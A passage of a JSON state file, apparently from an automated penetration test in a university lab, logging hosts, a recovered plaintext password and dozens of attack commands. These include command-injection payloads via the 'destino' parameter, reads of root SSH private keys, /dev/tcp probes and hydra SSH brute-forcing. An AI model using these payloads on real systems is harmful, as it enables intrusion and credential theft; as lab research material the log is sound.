@@ -1,0 +1,784 @@
+{
+ "hosts": [
+  {
+   "endereco": "172.20.0.5",
+   "nome": "atacante",
+   "subrede": "172.20.0.0/24",
+   "enumerado": false,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": true,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "servicos": []
+  },
+  {
+   "endereco": "172.20.0.1",
+   "nome": null,
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "servicos": [
+    {
+     "porta": 111,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "rpcbind",
+     "versao": "2-4 (RPC #100000)"
+    },
+    {
+     "porta": 50773,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "status",
+     "versao": "1 (RPC #100024)"
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.10",
+   "nome": "tcc-host-web.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": "injecao de comando em /diagnostico (param destino)",
+   "origem": false,
+   "titulo": "Diagnostico de rede -- infra interna",
+   "rotas": [
+    {
+     "caminho": "/diagnostico",
+     "metodo": "GET",
+     "parametros": [
+      "destino"
+     ]
+    }
+   ],
+   "usuario": "root",
+   "uid": 0,
+   "caminhos": [
+    "/proc/fs/cifs/SecurityFlags",
+    "/proc/sys/net/ipv4/fib_notify_on_flag_change",
+    "/proc/sys/net/ipv6/fib_notify_on_flag_change",
+    "/proc/kpageflags",
+    "/sys/devices/platform/serial8250/tty/ttyS2/flags",
+    "/sys/devices/platform/serial8250/tty/ttyS0/flags",
+    "/sys/devices/platform/serial8250/tty/ttyS3/flags",
+    "/sys/devices/platform/serial8250/tty/ttyS1/flags",
+    "/sys/devices/virtual/net/lo/flags",
+    "/sys/devices/virtual/net/eth0/flags",
+    "/sys/module/scsi_mod/parameters/default_dev_flags",
+    "/sys/module/usbip_core/parameters/usbip_debug_flag",
+    "/opt/diagnostico/app.py",
+    "/diagnostico",
+    "/root",
+    "/usr/local/bin",
+    "/opt/diagnostico",
+    "/root/.bashrc",
+    "/root/.profile",
+    "/root/.python_history",
+    "/root/.wget-hsts",
+    "/root/.ssh",
+    "/etc/resolv.conf",
+    "/etc/hosts",
+    "/usr/local/lib/python3.11/__pycache__/difflib.cpython-311.pyc",
+    "/usr/local/lib/python3.11/__pycache__/secrets.cpython-311.pyc",
+    "/usr/local/lib/python3.11/http/__pycache__/server.cpython-311.pyc",
+    "/usr/lib/x86_64-linux-gnu/libgnutls.so.30.34.3",
+    "/usr/lib/x86_64-linux-gnu/libcrypto.so.3",
+    "/usr/lib/x86_64-linux-gnu/engines-3/loader_attic.so",
+    "/usr/bin/gpgv",
+    "/etc/netconfig",
+    "/var/lib/dpkg/info/debconf.config",
+    "/var/lib/dpkg/info/tzdata.config",
+    "/var/lib/dpkg/info/ca-certificates.config",
+    "/var/lib/dpkg/triggers/ldconfig",
+    "/var/cache/debconf/config.dat-old",
+    "/var/cache/debconf/config.dat",
+    "/var/cache/ldconfig",
+    "/opt/diagnostico/config.ini"
+   ],
+   "caminhos_omitidos": 161,
+   "servicos": [
+    {
+     "porta": 8080,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "http-proxy",
+     "versao": "Werkzeug/3.1.8 Python/3.11.16"
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.11",
+   "nome": "tcc-host-glhf.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "servicos": [
+    {
+     "porta": 1337,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "waste",
+     "versao": null
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.12",
+   "nome": "tcc-srv-deploy.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": "svc_deploy",
+   "uid": 1000,
+   "caminhos": [
+    "/usr/share/nmap/scripts/http-cookie-flags.nse",
+    "/admin",
+    "/mail"
+   ],
+   "caminhos_omitidos": 0,
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "ssh",
+     "versao": "OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)"
+    }
+   ]
+  }
+ ],
+ "credenciais": [
+  {
+   "usuario": "svc_deploy",
+   "tipo": "senha",
+   "segredo": "7fQx2Lm9RtVzB4kd",
+   "origem": "172.20.0.10",
+   "validada_em": [
+    "172.20.0.12"
+   ],
+   "recusada_em": [
+    "172.20.0.12"
+   ]
+  }
+ ],
+ "alcances": [],
+ "tentativas": [
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -O -p- --open 172.20.0.0/24 -oN scan_inicial.txt",
+   "rotulo": "nmap -sV -O -p- --open 172.20.0.0/24 -oN scan_inicial.txt",
+   "alvo": "172.20.0.0/24",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "4 hosts, 5 servicos",
+   "revisao": 2
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -i -s -X GET http://172.20.0.10:8080/",
+   "rotulo": "curl -X GET http://172.20.0.10:8080/",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 3
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -X GET http://172.20.0.10:8080/diagnostico?destino=127.0.0.1",
+   "rotulo": "curl -X GET 'http://172.20.0.10:8080/diagnostico?destino=127.0.0.1'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "rejeitada pelo operador: fora do escopo do laboratorio: 127.0.0.1 nao esta em 172.20.0.0/24, 172.21.0.0/24",
+   "revisao": 3
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -X GET http://172.20.0.10:8080/diagnostico?destino=172.20.0.11",
+   "rotulo": "curl -X GET 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.11'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 3
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -X GET http://172.20.0.10:8080/diagnostico?destino=172.20.0.11;id",
+   "rotulo": "curl -X GET 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.11;id'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: usuario root",
+   "revisao": 5
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -X GET http://172.20.0.10:8080/diagnostico?destino=172.20.0.11;find / -iname \"*trofeu*\" -o -iname \"*flag*\" 2>/dev/null",
+   "rotulo": "curl -X GET 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.11;find / -iname \"*trofeu*\" -o -iname \"*flag*\" 2>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "curl falhou (codigo 3): curl: (3) URL using bad/illegal format or missing URL; http nao observado, 0 credencial(is)",
+   "revisao": 5
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -iname *trofeu* -o -iname *flag* 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -iname *trofeu* -o -iname *flag* 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 12 caminhos novos",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find /root /home /tmp /opt /var -iname *trofeu* -o -iname *flag* 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find /root /home /tmp /opt /var -iname *trofeu* -o -iname *flag* 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;ip a http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;ip a' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev -iname *trofeu* -o -iname *flag* 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev -iname *trofeu* -o -iname *flag* 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "nc -nv 172.20.0.11 1337",
+   "rotulo": "nc -nv 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo -1): tempo esgotado apos 300s; executado, codigo -1",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;nc -nv -w3 172.20.0.11 1337 2>&1 http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;nc -nv -w3 172.20.0.11 1337 2>&1' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sC -sV -p1337 172.20.0.11 -oN waste_scan.txt",
+   "rotulo": "nmap -sC -sV -p1337 172.20.0.11 -oN waste_scan.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;(echo; sleep 2) | nc -nv -w3 172.20.0.11 1337 2>&1 http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;(echo; sleep 2) | nc -nv -w3 172.20.0.11 1337 2>&1' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;(echo id; sleep 2) | nc -nv -w3 172.20.0.11 1337 2>&1 http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;(echo id; sleep 2) | nc -nv -w3 172.20.0.11 1337 2>&1' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://172.20.0.12 -t 4",
+   "rotulo": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo 255): [ERROR] File for logins not found: /usr/share/wordlists/metasploit/unix_users.txt; 0 senha(s), concluida=False",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://172.20.0.12",
+   "rotulo": "hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo 255): [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4; 0 senha(s), concluida=False",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.20.0.12",
+   "rotulo": "hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo 255): [ERROR] File for logins not found: /usr/share/metasploit-framework/data/wordlists/unix_users.txt; 0 senha(s), concluida=False",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;(exec 3<>/dev/tcp/172.20.0.11/1337; echo id >&3; timeout 3 cat <&3 2>&1) http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;(exec 3<>/dev/tcp/172.20.0.11/1337; echo id >&3; timeout 3 cat <&3 2>&1)' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;(exec 3<>/dev/tcp/172.20.0.11/1337; printf \"flag\\r\\n\" >&3; sleep 2; timeout 5 cat <&3 2>&1) http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;(exec 3<>/dev/tcp/172.20.0.11/1337; printf \"flag\\r\\n\" >&3; sleep 2; timeout 5 cat <&3 2>&1)' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;timeout 5 nc -nv 172.20.0.11 1337 </dev/null 2>&1 http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;timeout 5 nc -nv 172.20.0.11 1337 </dev/null 2>&1' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;(exec 3<>/dev/tcp/172.20.0.11/1337; timeout 5 cat <&3 2>&1) http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;(exec 3<>/dev/tcp/172.20.0.11/1337; timeout 5 cat <&3 2>&1)' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev \\( -iname \"id_rsa*\" -o -iname \"*.pem\" -o -path \"*/.ssh/*\" -o -iname \"known_hosts\" \\) 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev \\( -iname \"id_rsa*\" -o -iname \"*.pem\" -o -path \"*/.ssh/*\" -o -iname \"known_hosts\" \\) 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 152 nao guardados",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "nc -nv -w5 172.20.0.11 1337",
+   "rotulo": "nc -nv -w5 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "echo -e help\\r | nc -nv -w5 172.20.0.11 1337",
+   "rotulo": "echo -e 'help\\r' '|' nc -nv -w5 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "printf id\\r\\n | nc -nv -w5 172.20.0.11 1337",
+   "rotulo": "printf 'id\\r\\n' '|' nc -nv -w5 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "printf id\\r\\n | nc -nv -w5 172.20.0.11 1337",
+   "rotulo": "printf 'id\\r\\n' '|' nc -nv -w5 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": true,
+   "sucesso": true,
+   "resumo": "executado, codigo 0",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null | grep -vE \"^/(proc|sys)/\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev \\( -iname \"*trofeu*\" -o -iname \"*flag*\" \\) 2>/dev/null | grep -vE \"^/(proc|sys)/\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.20.0.12",
+   "rotulo": "hydra -l root ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo 255): [ERROR] File for passwords not found: /usr/share/wordlists/rockyou.txt; 0 senha(s), concluida=False",
+   "revisao": 7
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev -iname \"*.py\" 2>/dev/null | grep -Ev \"^/(usr|lib)\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev -iname \"*.py\" 2>/dev/null | grep -Ev \"^/(usr|lib)\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 1 caminhos novos",
+   "revisao": 8
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev -iname \"*.py\" 2>/dev/null | grep -Ev \"^/(usr|lib)\" | xargs -I{} sh -c \"echo ==={}===; cat {}\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev -iname \"*.py\" 2>/dev/null | grep -Ev \"^/(usr|lib)\" | xargs -I{} sh -c \"echo ==={}===; cat {}\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 1 caminhos novos",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.21.0.1;for i in $(seq 1 254); do ping -c1 -W1 172.21.0.$i >/dev/null 2>&1 && echo up 172.21.0.$i; done http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.21.0.1;for i in $(seq 1 254); do ping -c1 -W1 172.21.0.$i >/dev/null 2>&1 && echo up 172.21.0.$i; done' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.21.0.0/24",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -v --max-time 5 http://172.20.0.11:1337/",
+   "rotulo": "curl -v --max-time 5 http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;grep -inE \"pass|secret|token|key|ssh|deploy\" /opt/diagnostico/app.py http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;grep -inE \"pass|secret|token|key|ssh|deploy\" /opt/diagnostico/app.py' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "printf id\\r\\n | nc -nv -w5 172.20.0.11 1337",
+   "rotulo": "printf 'id\\r\\n' '|' nc -nv -w5 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -p1337 --script=banner 172.20.0.11 -oN banner_waste.txt",
+   "rotulo": "nmap -p1337 --script=banner 172.20.0.11 -oN banner_waste.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -l root -e nsr -t 4 ssh://172.20.0.12",
+   "rotulo": "hydra -l root -e nsr ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "0 senha(s), concluida=True",
+   "revisao": 9
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;env http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;env' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 3 caminhos novos",
+   "revisao": 10
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;ls -la /root /root/.ssh 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;ls -la /root /root/.ssh 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 4 caminhos novos",
+   "revisao": 11
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;for f in /root/.ssh/*; do echo ===$f===; cat \"$f\" 2>/dev/null; done http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;for f in /root/.ssh/*; do echo ===$f===; cat \"$f\" 2>/dev/null; done' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 1 caminhos novos",
+   "revisao": 12
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;cat /root/.ssh/id_rsa 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;cat /root/.ssh/id_rsa 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 12
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev -type f -newer /etc/hostname 2>/dev/null | grep -vE \"^/(proc|sys)/\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev -type f -newer /etc/hostname 2>/dev/null | grep -vE \"^/(proc|sys)/\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 5 caminhos novos",
+   "revisao": 13
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev -type f -newer /etc/hostname 2>/dev/null | grep -vE \"^/(proc|sys)/\" | xargs -I{} sh -c \"echo ===  {}===; cat {} 2>/dev/null\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev -type f -newer /etc/hostname 2>/dev/null | grep -vE \"^/(proc|sys)/\" | xargs -I{} sh -c \"echo ===  {}===; cat {} 2>/dev/null\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 13
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -l deploy -e nsr ssh://172.20.0.12",
+   "rotulo": "hydra -l deploy -e nsr ssh://172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "0 senha(s), concluida=True",
+   "revisao": 13
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;cat /root/.python_history /root/.bash_history /root/.wget-hsts 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;cat /root/.python_history /root/.bash_history /root/.wget-hsts 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 13
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;grep -rls \"PRIVATE KEY\" / --exclude-dir=proc --exclude-dir=sys 2>/dev/null http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;grep -rls \"PRIVATE KEY\" / --exclude-dir=proc --exclude-dir=sys 2>/dev/null' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 4 caminhos novos",
+   "revisao": 14
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;grep -rls \"PRIVATE KEY\" / --exclude-dir=proc --exclude-dir=sys 2>/dev/null | xargs -I{} sh -c \"echo ===  {}===; cat {}\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;grep -rls \"PRIVATE KEY\" / --exclude-dir=proc --exclude-dir=sys 2>/dev/null | xargs -I{} sh -c \"echo ===  {}===; cat {}\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 14
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -G --data-urlencode destino=172.20.0.11;find / -xdev \\( -iname \"*deploy*\" -o -iname \"*.git\" -o -iname \"*config*\" \\) 2>/dev/null | grep -vE \"^/(proc|sys|usr|lib)\" http://172.20.0.10:8080/diagnostico",
+   "rotulo": "curl -G --data-urlencode 'destino=172.20.0.11;find / -xdev \\( -iname \"*deploy*\" -o -iname \"*.git\" -o -iname \"*config*\" \\) 2>/dev/null | grep -vE \"^/(proc|sys|usr|lib)\"' http://172.20.0.10:8080/diagnostico",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is); saida: 9 caminhos novos",
+   "revisao": 15
+  },
+  {
+   "ferramenta": "curl",
